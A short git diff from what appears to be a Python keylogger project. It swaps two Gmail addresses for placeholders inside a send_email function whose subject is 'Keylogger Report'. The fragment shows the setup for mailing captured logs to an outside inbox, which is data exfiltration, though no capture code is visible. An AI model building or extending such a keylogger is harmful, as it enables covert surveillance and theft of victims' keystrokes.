@@ -21,8 +21,8 @@ engine = pyttsx3.init()
 
 def send_email():
     # Email setup
-    from_address = "t613404486@gmail.com"
-    to_address = "ayoubbnamar67@gmail.com"
+    from_address = "EMAIL@gmail.com"
+    to_address = "EMAIL@gmail.com"
     subject = "Keylogger Report"
     body = "Attached is the latest keylogger report."
 
